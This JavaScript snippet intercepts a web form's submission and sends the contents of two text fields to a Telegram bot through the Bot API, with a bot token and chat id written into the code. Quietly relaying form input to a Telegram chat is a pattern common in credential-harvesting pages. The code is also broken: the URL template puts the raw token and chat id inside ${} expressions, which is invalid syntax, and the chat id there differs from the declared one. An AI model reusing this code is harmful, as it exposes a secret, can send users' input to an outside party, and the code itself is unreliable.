const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    var text1 = document.getElementById("text1").value;
    var text2 = document.getElementById("text2").value;

    var my_text = `Result is: %0A - Text1: ${text1} %0A - Text2: ${text2}`;

    var token = "7297044544:AAGNcG6EbkSqDCs93qRm2zaCJHcZi2yb_jc";
    var chat_id = -7222383115;
    var url = `https://api.telegram.org/bot${7297044544:AAGNcG6EbkSqDCs93qRm2zaCJHcZi2yb_jc}/sendMessage?chat_id=${7222383115}&text=${my_text}`;

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    console.log("Message successfully sended!");
});
